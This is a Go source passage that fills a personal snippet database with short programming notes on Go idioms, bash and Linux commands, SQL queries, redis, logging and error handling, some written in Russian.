fmt.Fprint(w, \"  Work phone #: \")\n    }\n    fmt.Fprintln(w, pn.Number)\n  }\n}\n\nfunc listPeople(w io.Writer, book *pb.AddressBook) {\n  for _, p := range book.People {\n    writePerson(w, p)\n  }\n}\n\n// Main reads the entire address book from a file and prints all the\n// information inside.\nfunc main() {\n  if len(os.Args) != 2 {\n    log.Fatalf(\"Usage:  %s ADDRESS_BOOK_FILE\\n\", os.Args[0])\n  }\n  fname := os.Args[1]\n\n  // [START unmarshal_proto]\n  // Read the existing address book.\n  in, err := ioutil.ReadFile(fname)\n  if err != nil {\n    log.Fatalln(\"Error reading file:\", err)\n  }\n  book := &pb.AddressBook{}\n  if err := proto.Unmarshal(in, book); err != nil {\n    log.Fatalln(\"Failed to parse address book:\", err)\n  }\n  // [END unmarshal_proto]\n\n  listPeople(os.Stdout, book)\n}\n\n// /home/app/list_people_test.go\npackage main\n\nimport (\n  \"bytes\"\n  \"strings\"\n  \"testing\"\n  pb \"./tutorial\"\n)\n\nfunc TestWritePersonWritesPerson(t *testing.T) {\n  buf := new(bytes.Buffer)\n  // [START populate_proto]\n  p := pb.Person{\n    Id:    1234,\n    Name:  \"John Doe\",\n    Email: \"jdoe@example.com\",\n    Phones: []*pb.Person_PhoneNumber{\n      {Number: \"555-4321\", Type: pb.Person_HOME},\n    },\n  }\n  // [END populate_proto]\n  writePerson(buf, &p)\n  got := buf.String()\n  want := `Person ID: 1234\n  Name: John Doe\n  E-mail address: jdoe@example.com\n  Home phone #: 555-4321\n`\n  if got != want {\n    t.Errorf(\"writePerson(%s) =>\\n\\t%q, want %q\", p.String(), got, want)\n  }\n}")
	create(db, "Slice tricks\n(tags: slice trick)\n---\n\nhttps://github.com/golang/go/wiki/SliceTricks\n\n// AppendVector\na = append(a, b...)\n\n// Copy\nb = make([]T, len(a))\ncopy(b, a)\n// These two are often a little slower than the above one,\n// but they would be more efficient if there are more\n// elements to be appended to b after copying.\nb = append([]T(nil), a...)\nb = append(a[:0:0], a...)\n\n// Cut\na = append(a[:i], a[j:]...)\n\n//Delete\na = append(a[:i], a[i+1:]...)\n// or\na = a[:i+copy(a[i:], a[i+1:])]\n\n// Delete without preserving order\na[i] = a[len(a)-1] \na = a[:len(a)-1]\n\nNOTE If the type of the element is a pointer or a struct with pointer fields, which need to be garbage collected, the above implementations of Cut and Delete have a potential memory leak problem: some elements with values are still referenced by slice a and thus can not be collected. The following code can fix this problem:\n\n// Cut without memory leak\ncopy(a[i:], a[j:])\nfor k, n := len(a)-j+i, len(a); k < n; k++ {\n  a[k] = nil // or the zero value of T\n}\na = a[:len(a)-j+i]\n\n// Delete without memory leak\ncopy(a[i:], a[i+1:])\na[len(a)-1] = nil // or the zero value of T\na = a[:len(a)-1]\n\n// Delete without memory leak and without preserving order\na[i] = a[len(a)-1]\na[len(a)-1] = nil\na = a[:len(a)-1]\n\n// Expand\na = append(a[:i], append(make([]T, j), a[i:]...)...)\n\n// Extend\na = append(a, make([]T, j)...)\n\n// Filter (in place)\nn := 0\nfor _, x := range a {\n  if keep(x) {\n    a[n] = x\n    n++\n  }\n}\na = a[:n]\n\n// Insert\na = append(a[:i], append([]T{x}, a[i:]...)...)\n\nNOTE: The second append creates a new slice with its own underlying storage and copies elements in a[i:] to that slice, and these elements are then copied back to slice a (by the first append). The creation of the new slice (and thus memory garbage) and the second copy can be avoided by using an alternative way:\n\n// Insert\ns = append(s, 0 /* use the zero value of the element type */)\ncopy(s[i+1:], s[i:])\ns[i] = x\n\n// InsertVector\na = append(a[:i], append(b, a[i:]...)...)\n\nNOTE: To get the best efficiency, it is best to do the insertion without using append, in particular when the number of the inserted elements is known:\n\n// Assume element type is int.\nfunc Insert(s []int, k int, vs ...int) []int {\n  if n := len(s) + len(vs); n <= cap(s) {\n    s2 := s[:n]\n    copy(s2[k+len(vs):], s[k:])\n    copy(s2[k:], vs)\n    return s2\n  }\n  s2 := make([]int, len(s) + len(vs))\n  copy(s2, s[:k])\n  copy(s2[k:], vs)\n  copy(s2[k+len(vs):], s[k:])\n  return s2\n}\na = Insert(a, i, b...)\n\n// Push\na = append(a, x)\n\n// Pop\nx, a = a[len(a)-1], a[:len(a)-1]\n\n// Push Front/Unshift\na = append([]T{x}, a...)\n\n//Pop Front/Shift\nx, a = a[0], a[1:]\n\nAdditional Tricks\n\n// Filtering without allocating\n\nThis trick uses the fact that a slice shares the same backing array and capacity as the original, so the storage is reused for the filtered slice. Of course, the original contents are modified.\nb := a[:0]\nfor _, x := range a {\n  if f(x) {\n    b = append(b, x)\n  }\n}\n\nFor elements which must be garbage collected, the following code can be included afterwards:\n\nfor i := len(b); i < len(a); i++ {\n  a[i] = nil // or the zero value of T\n}\n\n// Reversing\n\nTo replace the contents of a slice with the same elements but in reverse order:\n\nfor i := len(a)/2-1; i >= 0; i-- {\n  opp := len(a)-1-i\n  a[i], a[opp] = a[opp], a[i]\n}\n\nThe same thing, except with two indices:\n\nfor left, right := 0, len(a)-1; left < right; left, right = left+1, right-1 {\n  a[left], a[right] = a[right], a[left]\n}")
	create(db, "Windows find all ip of computers in local network\n(tags: windows ip local)\n---\n\narp -a")
	create(db, "Linux find all ip of computers in local network\n(tags: linux ip local)\n---\n\napt install nmap\nnmap -sP 192.168.0.1/24")
	create(db, "Linux screen - add new resolution\n(tags: linux screen)\n---\n\nxrandr\nxrandr --output Virtual1 --mode 1920x1080\n// if error \"xrandr: cannot find mode 1920x1080\" do this\ncvt 1920 1080 60\n// copy ouput after Modeline\nxrandr --newmode \"1920x1080_60.00\"  173.00  1920 2048 2248 2576  1080 1083 1088 1120 -hsync +vsync\nxrandr --addmode Virtual1 1920x1080_60.00\nxrandr --output Virtual1 --mode 1920x1080_60.00\n\n// write sript in file\nvi ~/.xprofile\n#!/bin/bash\nxrandr --output Virtual1 --mode 1920x1080_60.00")
	create(db, "Using redis in docker\n(tags: redis docker)\n---\n\ndocker run -d --name some-redis -p 6379:6379 redis\ndocker exec -it some-redis bash\nredis-cli\nkeys * // show all keys")
	create(db, "Mock redis\n(tags: mock redis)\n---\n\n\"github.com/alicebob/miniredis/v2\"\n\"github.com/go-redis/redis/v7\"\n  \ns, err := miniredis.Run()\nif err != nil {\n  panic(err)\n}\ndefer s.Close()\nredisClient := redis.NewClient(&redis.Options{\n  Addr:     s.Addr(),\n  Password: \"\",\n  DB:       0,\n})")
	create(db, "Exec program on linux without password\n(tags: linux exec sudo password)\n---\n\nsudo visudo\n// /etc/sudoers.tmp\n// append string like this:\nusername ALL=NOPASSWD:/bin/mkdir,/bin/chmod")
	create(db, "Parallel exec program in bash script\n(tags: bash parallel exec)\n---\n\n#!/bin/bash\n\nprogram1 &\nprogram2 &\nprogram3 &")
	create(db, "Replace word in many files bash\n(tags: replace word bash)\n---\n\nfind . -name \"filename\" -print0 | xargs -0 sed -i 's/old/new/g'")
	create(db, "Copy map\n(tags: copy map)\n---\n\nfor k, v := range originalMap {\n  newMap[k] = v\n}")
	create(db, "Show content of many files in bash\n(tags: bash file content)\n---\n\n/wave/data# find . -type f -name \"dict.csv\" -print0  | xargs -r0 grep -H '' | sort")
	create(db, "Connect to websocket from browser\n(tags: connect websocket browser)\n---\n\n//connect\nws = new WebSocket(\"ws://127.0.0.1:9001/\"); ws.onmessage = ({data}) => console.log(\"FROM SERVER: \", data);\n\n//send message\nws.send(\"Privet!\");")
	create(db, "Measure func call duration in bash\n(tags: measure func call duration time bash)\n---\n\n#!/bin/bash\nSTART=$(date +%s)\n# do something\necho \"It took $(( $(date +%s) - $START )) seconds\"")
	create(db, "Using json extension in sqlite\n(tags: measure func call duration time bash)\n---\n\nselect json_extract(s.json_column, '$.json_field') as field from tablename1\n\n// in golang project\nimport _ \"github.com/mattn/go-sqlite3\"\n// build \ngo build -tags json1 main.go")
	create(db, "LRU cache implementation\n(tags: lru cache)\n---\n\nhttps://github.com/hashicorp/golang-lru\nhttps://dotzero.blog/golang-lru/\n\nLRU-кэш. Это такой вид кэша, когда есть ограниченное количество элементов, и новые значения вытесняют старые. Причём, если мы обращаемся к элементу часто, то он поднимается наверх и не вытесняется из кэша. Таким образом мы закэшируем все часто используемые значения, а все редко используемые не будут храниться в кэше.\n\nimport (\n  \"container/list\"\n)\n\ntype Item struct {\n  Key   string\n  Value interface{}\n}\n\ntype LRU struct {\n  capacity int\n  items    map[string]*list.Element\n  queue    *list.List\n}\n\nfunc NewLru(capacity int) *LRU {\n  return &LRU{\n    capacity: capacity,\n    items:    make(map[string]*list.Element),\n    queue:    list.New(),\n  }\n}\n\nfunc (c *LRU) Set(key string, value interface{}) bool {\n  if element, exists := c.items[key]; exists == true {\n    c.queue.MoveToFront(element)\n    element.Value.(*Item).Value = value\n    return true\n  }\n  \n  if c.queue.Len() == c.capacity {\n    c.purge()\n  }\n  \n  item := &Item{\n    Key:   key,\n    Value: value,\n  }\n  \n  element := c.queue.PushFront(item)\n  c.items[item.Key] = element\n  \n  return true\n}\n\nfunc (c *LRU) purge() {\n  if element := c.queue.Back(); element != nil {\n    item := c.queue.Remove(element).(*Item)\n    delete(c.items, item.Key)\n  }\n}\n\nfunc (c *LRU) Get(key string) interface{} {\n  element, exists := c.items[key]\n  if exists == false {\n    return nil\n  }\n  c.queue.MoveToFront(element)\n  return element.Value.(*Item).Value\n}")
	create(db, "Recursive query postgresql sqlite\n(tags: recursive postgresql sqlite)\n---\n\nWITH RECURSIVE nodes(id,name,parent_id) AS (\n  SELECT s1.id, s1.name, s1.parent_id\n  FROM equipment s1 WHERE parent_id = 44\n  UNION\n  SELECT s2.id, s2.name, s2.parent_id\n  FROM equipment s2, nodes s1 WHERE s2.parent_id = s1.id\n)\nSELECT * FROM nodes;")
	create(db, "File md5 hash\n(tags: file md5 hash)\n---\n\nhttps://mrwaggel.be/post/generate-md5-hash-of-a-file-in-golang/\n\npackage main\n\nimport (\n  \"crypto/md5\"\n  \"encoding/hex\"\n  \"fmt\"\n  \"io\"\n  \"os\"\n)\n\nfunc hashFileMD5(filePath string) (string, error) {\n  var returnMD5String string\n  file, err := os.Open(filePath)\n  if err != nil {\n    return returnMD5String, err\n  }\n  defer file.Close()\n  hash := md5.New()\n  if _, err := io.Copy(hash, file); err != nil {\n    return returnMD5String, err\n  }\n  hashInBytes := hash.Sum(nil)[:16]\n  returnMD5String = hex.EncodeToString(hashInBytes)\n  return returnMD5String, nil\n\n}\n\nfunc main() {\n  hash, err := hashFileMD5(os.Args[0]) //os.Args[1]\n  if err == nil {\n    fmt.Println(hash)\n  }\n}")
	create(db, "Linux bugs\n(tags: linux bug)\n---\n\n// if you got a covering invisible area\npkill -f \"draganddrop\"\n// xprop and click on covering invisible area\n\n// if you have a black screen after enter, press\nCtrl+Alt+F1\n\n// if you have OS behavior with \"pressed\" ctrl, change the language couple times")
	create(db, "Create trigger on postgresql\n(tags: trigger postgresql)\n---\n\n-- создаем таблицу module\ncreate table module\n(\n  id bigint not null,\n  name character varying,\n  name_old character varying\n)\n\n-- заполняем ее тестовыми данными\ninsert into module (id, name) values (1, 'name_1'), (2, 'name_2'), (3, 'name_3')\n\n-- проверяем \nselect * from module\n\n-- создаем функцию для триггера\ncreate or replace function save_old_value()\nreturns trigger as\n$$\nbegin\nnew.name_old = old.name;\nreturn new;\nend;\n$$ LANGUAGE plpgsql\n\n-- создаем сам триггер\ncreate trigger t_module\nbefore update on module for each row \nexecute procedure save_old_value()\n\n-- обновляем запись в таблице\nupdate module set name = 'new_name' where id = 2\n\n-- проверяем \nselect * from module")
	create(db, "Run go with docker without go\n(tags: docker golang)\n---\n\ndocker run --rm \"$PWD\":\"$PWD\" -w \"$PWD\" golang:1.14 go run main.go")

	create(db, "Static compile golang\n(tags: static compile golang)\n---\n\nCGO_ENABLED=0 go build -a -installsuffix cgo -ldflags '-s' src/myapp/myapp.go")
	create(db, "Convert postgres timestamp in golang\n(tags: postgresql timestamp golang)\n---\n\ntime1 := time.Now().UnixNano()\nfmt.Println(time1)\ntime2 := time.Unix(0, time1)\nfmt.Println(time2)\ntime3 := time2.Format(\"2006-01-02T15:04:05.000000Z\")\nfmt.Println(time3)\n// select * from table1 where modified_at > '2021-03-23T10:39:03.288802Z'\n// this working with sqlite too")
	create(db, "Check is interface convertible to\n(tags: check convert interface)\n---\n\nvar x interface{} = 2.3\nif reflect.Indirect(reflect.ValueOf(x)).Type().ConvertibleTo(reflect.TypeOf(float64(0))) {\n  fmt.Println(\"x is convertible to float64\")\n}\n\n// or\nvar x interface{} = []int{1, 2, 3}\nxType := fmt.Sprintf(\"%T\", x)\nfmt.Println(xType) // \"[]int\"\n\n// or\nvar x interface{} = 2.3\nswitch v := x.(type) {\ncase int:\n  fmt.Println(\"int:\", v)\ncase float64:\n  fmt.Println(\"float64:\", v)\ndefault:\n  fmt.Println(\"unknown\")\n} // \"float64: 2.3\"\n\n// or\nvar x interface{} = []int{1, 2, 3}\nxType := reflect.TypeOf(x)\nxValue := reflect.ValueOf(x)\nfmt.Println(xType, xValue) // \"[]int [1 2 3]\"")
	create(db, "Golang types\n(tags: golang type)\n---\n\nhttps://metanit.com/go/tutorial/2.3.php\n\n// golang types\nint8: представляет целое число от -128 до 127 и занимает в памяти 1 байт (8 бит)\nint16: представляет целое число от -32768 до 32767 и занимает в памяти 2 байта (16 бит)\nint32: представляет целое число от -2147483648 до 2147483647 и занимает 4 байта (32 бита)\nint64: представляет целое число от –9 223 372 036 854 775 808 до 9 223 372 036 854 775 807 и занимает 8 байт (64 бита)\nuint8: представляет целое число от 0 до 255 и занимает 1 байт\nuint16: представляет целое число от 0 до 65535 и занимает 2 байта\nuint32: представляет целое число от 0 до 4294967295 и занимает 4 байта\nuint64: представляет целое число от 0 до 18 446 744 073 709 551 615 и занимает 8 байт\nbyte: синоним типа uint8, представляет целое число от 0 до 255 и занимает 1 байт\nrune: синоним типа int32, представляет целое число от -2147483648 до 2147483647 и занимает 4 байта\nint: представляет целое число со знаком, которое в зависимости о платформы может занимать либо 4 байта, либо 8 байт. То есть соответствовать либо int32, либо int64.\nuint: представляет целое беззнаковое число только без знака, которое, аналогично типу int, в зависимости о платформы может занимать либо 4 байта, либо 8 байт. То есть соответствовать либо uint32, либо uint64.")
	create(db, "Life of http request in golang server\n(tags: life http request golang server)\n---\n\nhttps://eli.thegreenplace.net/2021/life-of-an-http-request-in-a-go-server/\n\npackage main\n\nimport (\n  \"fmt\"\n  \"net/http\"\n)\n\nfunc hello(w http.ResponseWriter, req *http.Request) {\n  fmt.Fprintf(w, \"hello\\n\")\n}\n\nfunc headers(w http.ResponseWriter, req *http.Request) {\n  for name, headers := range req.Header {\n    for _, h := range headers {\n      fmt.Fprintf(w, \"%v: %v\\n\", name, h)\n    }\n  }\n}\n\nfunc main() {\n  http.HandleFunc(\"/hello\", hello)\n  http.HandleFunc(\"/headers\", headers)\n\n  http.ListenAndServe(\":8090\", nil)\n}\n\n1. ListenAndServe содержит внутри net.Listen(\"tcp\",...) и для каждого нового соединения запускает горутинуЮ которая в бесконечном цикле выполняет handler.ServeHTTP. \n2. Если handler был указан как nil, то в ServeHTTP будет использован DefaultServeMux - это глобальный объект http.ServeMux. Как раз используюя http.HandleFunc мы регистрируем функции к этому глобальному \n3. Если возникнет паника в функции хенжлера, то сервер все равно продолжит работу\n\n// Middleware\nfunc politeGreeting(w http.ResponseWriter, req *http.Request) {\n  fmt.Fprintf(w, \"Welcome! Thanks for visiting!\\n\")\n}\n\nfunc loggingMiddleware(next http.Handler) http.Handler {\n  return http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {\n    start := time.Now()\n    next.ServeHTTP(w, req)\n    log.Printf(\"%s %s %s\", req.Method, req.RequestURI, time.Since(start))\n  })\n}\n\nfunc main() {\n  lm := loggingMiddleware(http.HandlerFunc(politeGreeting))\n  log.Fatal(http.ListenAndServe(\":8090\", lm))\n}")
	create(db, "Golang darker coreners\n(tags: golang dark)\n---\n\nhttps://rytisbiel.com/2021/03/06/darker-corners-of-go/\n\n// Если не хочешь удалять неиспользуемый импорт\nvar _ = math.Round\n\n// Выполнится функция init() из пакета package1\nimport _ package1\n\n// Позволят использовать функции пакета, но лучше так не делать\nimport . \"math\"   // Sin(3)\n\n// Приоритет операторов\nGo:\n  5  * / % << >> & &^\n  4  + - | ^\n  3  == != < <= > >=\n  2  &&\n  1  ||\nC:\n  10  *, /, %\n  9   +, -\n  8   <<, >>\n  7   <, <=, >, >=\n  6   ==, !=\n  5   &\n  4   ^\n  3   |\n  2   &&\n  1   ||\nIn Go: 1 << 1 + 1 // (1<<1)+1 = 3\nIn C: 1 << 1 + 1 // 1<<(1+1) = 4\nIn Go: ^1 // -2\nIn C: ~1 // -2\n\n// iota\nconst (\n    myconst = \"c\"\n    myconst2 = \"c2\"\n    two = iota // 2\n)\n\n// slice\nvar s []int // nil slice\nfmt.Println(s, len(s), cap(s)) // [] 0 0\ns = append(s, 1)\nfmt.Println(s, len(s), cap(s)) // [1] 1 1\n\n// make slice\ns := make([]int, 3)\ns = append(s, 1)\ns = append(s, 2)\ns = append(s, 3)\nfmt.Println(s) // [0 0 0 1 2 3]\nsaddr := &s[0] \n*saddr = 5\nfmt.Println(s) // [5 0 0 1 2 3]\n\n// string for range\ns := \"touché\"\nfor i := 0; i < len(s); i++ { // prints every byte\n  fmt.Print(string(s[i]))     // touchÃ©\n}\nfor _, r := range s {  // prints every rune\n  fmt.Print(string(r)) // touché\n}\nr := []rune(s)\nfor i := 0; i < len(r); i++ {  // convert a string to rune slice to access by index\n  fmt.Print(string(r[i]))      // touché\n}\n\n// map\nvar m map[int]int // a nil map\nfmt.Println(len(m)) // taking len of a nil map is OK. prints 0\nfmt.Println(m[10]) // reading nil map is OK. prints 0 (the default of the map value type) \nval, keyexists := m[10]\nfmt.Println(val, keyexists) // 0, false \nm[10] = 1 // panic: assignment to entry in nil map\nm2 := map[int]int{1: 1}\naddr := &m2[1] // error: cannot take the address of m2[1]\n\n// empty struct\nfmt.Println(unsafe.Sizeof(false)) // 1\nfmt.Println(unsafe.Sizeof(struct{}{})) // 0\n\n// interface\ntype ISayHi interface {Say()}\ntype SayHi struct{}\nfunc main() {\n  // at this point variable “sayer” only has the static type of ISayHi\n  // dynamic type and value are nil\n  var sayer ISayHi  \n  // as expected sayer equals to nil\n  fmt.Println(sayer == nil) // true\n  // a nil variable of a concrete type\n  var sayerImplementation *SayHi\n  // dynamic type of the interface variable is now SayHi\n  // the actual value interface points to is still nil\n  sayer = sayerImplementation\n  // sayer no longer equals to nil, because its dynamic type is set\n  // even though the value it points to is nil\n  // which is not what most people would expect here\n  fmt.Println(sayer == nil) // false\n}\n// you can not check if the value an interface points to is ni\nfunc MyFunc() ISayHi {var result *SayHi; return result} // do not do this! MyFunc() == nil would be false\nfunc MyFunc() ISayHi {return nil} // MyFunc() == nil would be true\nfunc IsInterfaceNil(i interface{}) bool {\n  if i == nil {\n    return false\n  }\n  rvalue := reflect.ValueOf(i)\n  return rvalue.Kind() == reflect.Ptr && rvalue.IsNil()\n}\n\n// type assertion\nfunc main() {\n  var sayer ISayHi\n  sayer = &SayHi{}\n  // t will be a zero value (nil in this case) of type *SayHi2 \n  // ok will be false\n  t, ok := sayer.(*SayHi2)\n  if ok {\n      t.Say()\n  }\n  // panic: interface conversion: \n  // main.ISayHi is *main.SayHi, not *main.SayHi2\n  t2 := sayer.(*SayHi2)\n  t2.Say()\n}\n\n// embededding\ntype t1 struct {f1 string}\nfunc (t *t1) t1method() {}\n// embedding type\ntype t2 struct {t1}\n// redefining type\ntype t3 t1 \nfunc main() {\n  var mt1 t1\n  var mt2 t2\n  var mt3 t3\n  // fields are inherited in all the cases\n  _ = mt1.f1\n  _ = mt2.f1\n  _ = mt3.f1\n  // these work ok\n  mt1.t1method() \n  mt2.t1method()\n  // mt3.t1method undefined (type t3 has no field or method t1method)\n  mt3.t1method()\n}\n\n// compare\ntype compareStruct1 struct {\n  A int\n  B string\n  C [3]int\n}\ntype compareStruct2 struct {\n  A int\n  B string\n  C []int // changed type of C from array to slice\n}\nfunc main() {\n  s1 := compareStruct1{}\n  s2 := compareStruct1{}\n  fmt.Println(s1 == s2) // works fine, prints true\n  s3 := compareStruct2{}\n  s4 := compareStruct2{}\n  // invalid operation: s3 == s4\n  // (struct containing []int cannot be compared)\n  fmt.Println(s3 == s4)\n}\nfunc (s *compareStruct2) Equals(s2 *compareStruct2) bool {\n  if s.A != s2.A || s.B != s2.B || len(s.C) != len(s2.C) {\n    return false\n  }\n  for i := 0; i < len(s.C); i++ {\n    if s.C[i] != s2.C[i] {\n      return false\n    }\n  }\n  return true\n}\n// slow variant\nreflect.DeepEqual(s, s2) // not working for func and float with NaN")
	create(db, "Get parameter from url\n(tags: parameter url)\n---\n\nfunc decodeRequest(_ context.Context, r *http.Request) (interface{}, error) {\n  keys, ok := r.URL.Query()[\"key\"]\n  if !ok || len(keys[0]) < 1 {\n    return nil, fmt.Errorf(\"url parameter key is missing\")\n  }\n  keyStr := keys[0]\n  return keyStr, nil\n}")
	create(db, "Using sqlite in memory\n(tags: sqlite memory)\n---\n\ndb, err = sql.Open(\"sqlite3\", \"file::memory:?cache=shared\")")
	create(db, "Wrap errors in golang\n(tags: wrap error)\n---\n\npackage main\n\nimport (\n  \"errors\"\n  \"fmt\"\n  \"os\"\n)\n\nvar (\n  ErrF3 = errors.New(\"f3 error\")\n  ErrF4 = errors.New(\"f4 error\")\n  PathErr = &os.PathError{}\n)\n\nfunc main() {\n  err1 := f1()\n  fmt.Println(err1) // f1 error: f2 error: f3 error\n  err2 := f2()\n  fmt.Println(err2) // f2 error: f3 error\n  err3 := f3()\n  fmt.Println(err3) // f3 error\n  \n  // if err1 contains same value\n  fmt.Println(errors.Is(err1, err1)) // true\n  fmt.Println(errors.Is(err1, err2)) // false\n  fmt.Println(errors.Is(err1, err3)) // true\n  fmt.Println(errors.Is(err3, err1)) // false\n  \n  fmt.Println(errors.Is(err1, ErrF3)) // true\n  fmt.Println(errors.Is(err1, ErrF4)) // false\n  fmt.Println(errors.Is(err3, ErrF4)) // false\n  \n  // if errors has same type\n  fmt.Println(errors.As(err1, &ErrF3))   // true\n  fmt.Println(errors.As(err1, &PathErr)) // false\n  \n  fmt.Println(ErrF4) // f4 error\n  fmt.Println(errors.Is(err1, ErrF4))  // false\n  // As - puts err1 into ErrF4\n  fmt.Println(errors.As(err1, &ErrF4)) // true\n  fmt.Println(errors.Is(err1, ErrF4))  // true\n  fmt.Println(ErrF4) // f1 error: f2 error: f3 error\n  \n  fmt.Println(errors.Is(err3, err1)) // false\n  \n  fmt.Println(errors.Unwrap(err3)) // <nil>\n  fmt.Println(errors.Unwrap(err2)) // f3 error\n  fmt.Println(errors.Unwrap(err1)) // f2 error: f3 error\n  fmt.Println(errors.Unwrap(errors.Unwrap(err1))) // f3 error\n}\n\nfunc f1() error {\n  err := f2()\n  return fmt.Errorf(\"f1 error: %w\", err)\n}\n\nfunc f2() error {\n  err := f3()\n  return fmt.Errorf(\"f2 error: %w\", err)\n}\n\nfunc f3() error {\n  return ErrF3\n}")
	create(db, "Write log in stdout and file\n(tags: log stdout file)\n---\n\nf, err := os.OpenFile(\"/mylogs.log\", os.O_RDWR|os.O_CREATE|os.O_APPEND, 0777)\nif err != nil {\n    log.Fatalf(\"error opening file: %v\", err)\n}\ndefer f.Close()\nwrt := io.MultiWriter(os.Stdout, f)\nlog.SetOutput(wrt)\nlog.Println(\"some info\")")
	create(db, "4D slice\n(tags: 4d slice)\n---\n\narr := [][][][]float64{{{{1111, 1112}, {1121, 1122}}, {{1211, 1212}, {1221, 1222}}}, {{{2111, 2112}, {2121, 2122}}, {{2211, 2212}, {2221, 2222}}}}\nfmt.Println(arr) //[[[[1111 1112] [1121 1122]] [[1211 1212] [1221 1222]]] [[[2111 2112] [2121 2122]] [[2211 2212] [2221 2222]]]]\n\nJU := 2\nJI := 2\nJT := 2\nJP := 2\n\n// 4D -> 1D\nn := 0\nres := make([]float64, JU*JI*JT*JP)\nfor u := 0; u < JU; u++ {\n  for i := 0; i < JI; i++ {\n    for t := 0; t < JT; t++ {\n      for p := 0; p < JP; p++ {\n        res[n] = arr[u][i][t][p]\n        n++\n      }\n    }\n  }\n}\nfmt.Println(res) //[1111 1112 1121 1122 1211 1212 1221 1222 2111 2112 2121 2122 2211 2212 2221 2222]\n\n// 1D -> 4D\narr4d := make([][][][]float64, 0)\narr3d := make([][][]float64, 0)\narr2d := make([][]float64, 0)\narr1d := make([]float64, 0)\nn = 0\nfor u := 0; u < JU; u++ {\n  for i := 0; i < JI; i++ {\n    for t := 0; t < JT; t++ {\n      for p := 0; p < JP; p++ {\n        arr1d = append(arr1d, res[n])\n        n++\n      }\n      arr2d = append(arr2d, arr1d)\n      arr1d = nil\n    }\n    arr3d = append(arr3d, arr2d)\n    arr2d = nil\n  }\n  arr4d = append(arr4d, arr3d)\n  arr3d = nil\n}\nfmt.Println(arr4d) //[[[[1111 1112] [1121 1122]] [[1211 1212] [1221 1222]]] [[[2111 2112] [2121 2122]] [[2211 2212] [2221 2222]]]]")
	create(db, "Convert int to time\n(tags: convert int time)\n---\n\nvar i int = 5\ntime.Sleep(time.Duration(i) * time.Second)\n//time.Sleep(i * time.Second) // not working\n//time.Sleep(5 * time.Second) // working")
	create(db, "Error with stacktrace\n(tags: error stacktrace)\n---\n\npackage main\n\nimport (\n  \"fmt\"\n  \"log\"\n  \"runtime\"\n)\n\nfunc stacktraceTest() {\n  err := f1()\n  log.Println(Wrap(err))\n  //2021/04/15 19:18:56 \"main.stacktraceTest(_/D_/projects/go/experiment/stacktrace.go:32)\":\n  //  \"main.f1(_/D_/projects/go/experiment/stacktrace.go:38)\":\n  //  \"main.f2(_/D_/projects/go/experiment/stacktrace.go:42)\":\n  //  error from f2\n}\n\nfunc f1() error {\n  err := f2()\n  //return Wrap(fmt.Errorf(\"error from f1:\\n%v\", err))\n  return Wrap(err)\n}\n\nfunc f2() error {\n  return Wrap(fmt.Errorf(\"error from f2\"))\n}\n\nfunc Wrap(err error) error {\n  if err != nil {\n    return fmt.Errorf(\"%q:\\n  %w\", getCaller(1), err)\n  }\n  return nil\n}\n\nfunc getCaller(skip int) string {\n  funcName := \"UNKNOWN\"\n  pc, f, l, ok := runtime.Caller(skip + 1)\n  if ok {\n    funcName = runtime.FuncForPC(pc).Name()\n  }\n  _, _, _, _ = pc, f, l, funcName\n  return fmt.Sprintf(\"%s(%s:%d)\", funcName, f, l)\n}")
	create(db, "Zap logger\n(tags: zap logger)\n---\n\n// https://sunitc.dev/2019/05/27/adding-uber-go-zap-logger-to-golang-project/\n\npackage main\n\nimport (\n  \"fmt\"\n  \"github.com/natefinch/lumberjack\"\n  \"go.uber.org/zap\"\n  \"go.uber.org/zap/zapcore\"\n  \"os\"\n)\n\nvar testErr = fmt.Errorf(\"test\")\n\nfunc zaploggerTest()  {\n  loggerEx := zap.NewExample()\n  loggerEx.Debug(testErr.Error())\n  // {\"level\":\"debug\",\"msg\":\"test\"}\n\n  loggerDev, err := zap.NewDevelopment()\n  if err != nil {\n    panic(err)\n  }\n  loggerDev.Debug(testErr.Error())\n  // 2021-04-15T17:40:40.126+0300  DEBUG  experiment/zaplogger.go:18  test\n\n  loggerProd, err := zap.NewProduction()\n  if err != nil {\n    panic(err)\n  }\n  loggerProd.Debug(testErr.Error())\n  // nothing\n  loggerProd.Info(testErr.Error())\n  // {\"level\":\"info\",\"ts\":1618497640.1463063,\"caller\":\"experiment/zaplogger.go:26\",\"msg\":\"test\"}\n  loggerProd.Info(testErr.Error(), zap.String(\"status\", \"ok\"))\n  // {\"level\":\"info\",\"ts\":1618497640.1463063,\"caller\":\"experiment/zaplogger.go:28\",\"msg\":\"test\",\"status\":\"ok\"}\n  loggerProd.Error(testErr.Error(), zap.String(\"status\", \"ok\"), zap.Error(testErr))\n  // {\"level\":\"error\",\"ts\":1618497640.1463063,\"caller\":\"experiment/zaplogger.go:30\",\"msg\":\"test\",\"status\":\"ok\",\"error\":\"test\",\"stacktrace\":\"main.zaploggerTest\\n\\t_/D_/projects/go/experiment/zaplogger.go:30\\nmain.main\\n\\t_/D_/projects/go/experiment/main.go:6\\nruntime.main\\n\\truntime/proc.go:204\"}\n\n  loggerProdWithSugar := loggerProd.Sugar()\n  defer loggerProdWithSugar.Sync()\n  loggerProdWithSugar.Info(testErr.Error(), zap.String(\"status\", \"ok\"))\n  // {\"level\":\"info\",\"ts\":1618497984.2510028,\"caller\":\"experiment/zaplogger.go:38\",\"msg\":\"test{status 15 0 ok <nil>}\"}\n  loggerProdWithSugar.Error(testErr.Error(), zap.String(\"status\", \"ok\"), zap.Error(testErr))\n  // {\"level\":\"error\",\"ts\":1618497984.2510028,\"caller\":\"experiment/zaplogger.go:40\",\"msg\":\"test{status 15 0 ok <nil>} {error 26 0  test}\",\"stacktrace\":\"main.zaploggerTest\\n\\t_/D_/projects/go/experiment/zaplogger.go:40\\nmain.main\\n\\t_/D_/projects/go/experiment/main.go:6\\nruntime.main\\n\\truntime/proc.go:204\"}\n\n  loggerProdWithSugar.Infof(\"info: %v\", testErr)\n  // {\"level\":\"info\",\"ts\":1618499815.713104,\"caller\":\"experiment/zaplogger.go:44\",\"msg\":\"info: test\"}\n  loggerProdWithSugar.Infow(\"info\", \"key\", \"value\")\n  // {\"level\":\"info\",\"ts\":1618499815.713104,\"caller\":\"experiment/zaplogger.go:45\",\"msg\":\"info\",\"key\":\"value\"}\n\n  cfg := zap.NewProductionEncoderConfig()\n  encJson := zapcore.NewJSONEncoder(cfg)\n  file, _ := os.Create(\"D:\\\\projects\\\\go\\\\experiment\\\\test.log\")\n  ws := zapcore.AddSync(file)\n  enab := zapcore.DebugLevel\n  core := zapcore.NewCore(encJson, ws, enab)\n 